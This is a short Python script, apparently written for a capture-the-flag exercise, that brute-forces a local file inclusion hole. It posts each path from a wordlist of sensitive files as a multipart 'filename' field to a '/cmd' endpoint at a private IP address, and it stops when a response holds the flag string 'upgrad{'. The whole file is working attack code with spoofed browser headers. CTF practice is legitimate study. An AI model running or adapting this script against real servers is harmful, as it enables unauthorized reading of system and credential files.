import requests
import time

file = open("password-file_LFI_list.txt")

paths = file.read()

path_list = paths.splitlines()
print('Brutefore Path starts... ')
count = 0;

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36",
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "accept-language": "en-US,en;q=0.9",
    "cache-control": "max-age=0",
    "content-type": "multipart/form-data; boundary=----WebKitFormBoundarylD2VbggABklTXxgM",
    "proxy-connection": "keep-alive",
    "upgrade-insecure-requests": "1"
}
code=0;
for path in path_list:
    try:
        ##time.sleep(1)  # delay 1 sec
        # url = f'http://localhost:'PORT'/PATH/FOR/API?username=admin&password={password}'
        url = f'http://10.0.1.25:13375/cmd'
        payload = f'------WebKitFormBoundarylD2VbggABklTXxgM\r\nContent-Disposition: form-data; name=\"filename\"\r\n\r\n{path}\r\n------WebKitFormBoundarylD2VbggABklTXxgM--\r\n'

        r = requests.post(url, headers=headers, data=payload)
        code = r.status_code
        r_response = r.text
    except requests.ConnectionError:
        pass
    if code == 200 or code == 301 or code == 302:
        print('Path Exist:', path + " success:" + str(code))
        if r_response.find("upgrad{") > 0:
            print("Flag found!!!")
            exit()
        print('response:', r_response)

    else:
        print('Path Not Found: error:', str(code) + "   -count: " + str(count))
        count = count + 1
    if code == 200 or code == 301 or code == 302:
        exit()
else:
    print('Path Not Found Program Exit')
